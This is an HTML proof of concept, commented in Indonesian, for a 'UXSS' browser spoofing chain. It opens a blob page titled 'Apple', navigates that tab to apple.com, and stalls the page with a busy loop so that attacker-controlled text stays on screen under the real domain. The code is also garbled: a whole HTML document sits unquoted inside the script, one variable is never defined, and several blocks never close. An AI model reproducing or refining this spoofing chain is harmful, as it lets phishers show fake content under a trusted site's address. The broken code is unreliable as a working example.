<!doctype html>

  <body>
    <div class="container">
      <h1>UXSS Full Chaining Engine</h1>
      <button id="startBtn">EXECUTE FULL UXSS CHAIN</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membangun Payload Injeksi Mandiri (Self-Sustaining Vector)

          <!DOCTYPE html>
          <html>
          <head>
            <title>Apple</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">

          <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
            <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
            <script>
              // Vector Watchdog: Menjaga DOM tetap terkunci pada teks kustom
              try {
                const observer = new MutationObserver(() => {
                  if (!document.getElementById('spoof-text')) {
                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                  }
                });
                observer.observe(document.documentElement, { childList: true, subtree: true });
              } catch(e) {}

              setInterval(() => {
                if (!document.getElementById('spoof-text') || document.body.innerText.trim() !== 'HALLO') {
                  document.open();

        // Membuat Blob URI untuk menghindari about:blank kosong
        const blob = new Blob([payloadHtml], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);

        // 2. Membuka tab baru melalui Blob Target
        const newTab = window.open(blobUrl, "_blank");

        if (newTab) {
          try { newTab.focus(); } catch (e) {}

          // 3. Chain Step A (10ms): Manipulasi history state untuk mencemari antrean NavigationManager

              newTab.history.pushState({uxss: true}, "", "#secure-enclave-chain");

          // 4. Chain Step B (20ms): Memicu transisi navigasi utama ke domain target
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 20);

          // 5. Chain Step C (40ms): Thread Stalling & Reflow Flooding untuk mengunci antrean frame
          setTimeout(() => {
            try {
              newTab.eval(`
                const startTime = Date.now();
                while (Date.now() - startTime < 6000) {
                  const reflow = document.body.offsetHeight;
                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
                  
                  if (!document.getElementById('spoof-text')) {
                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                  }

              `);
            } catch (e) {
              let start = Date.now();
              while (Date.now() - start < 6000) {}
